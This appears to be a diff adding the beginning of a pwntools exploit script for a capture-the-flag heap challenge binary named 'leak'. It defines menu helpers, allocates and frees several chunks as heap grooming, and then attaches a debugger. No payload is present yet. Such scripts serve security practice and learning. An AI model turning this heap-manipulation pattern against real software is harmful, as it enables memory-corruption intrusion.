@@ -1,0 +1,37 @@
+from pwn import * 
+from LibcSearcher import * 
+# context.log_level = 'debug' 
+p=process('./leak')
+elf=ELF('./leak')
+def add(index,size):
+    p.recvuntil(b'6. exit\n')
+    p.recvuntil(b'Your choice: ')
+    p.sendline(b'1')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Size: ')
+    p.sendline(str(size).encode())
+def edit(index,content):
+    p.recvuntil(b'6. exit\n')
+    p.recvuntil(b'Your choice: ')
+    p.sendline(b'2')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Content: ')
+    p.send(content)
+def free(index):
+    p.recvuntil(b'6. exit\n')
+    p.recvuntil(b'Your choice: ')
+    p.sendline(b'3')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+p.recvuntil(b'set up.\n')
+add(0,0x20)
+add(1,0x20)
+add(2,0x20)
+add(3,0x20)
+free(0)
+free(1)
+free(2)
+gdb.attach(p)
+p.interactive()
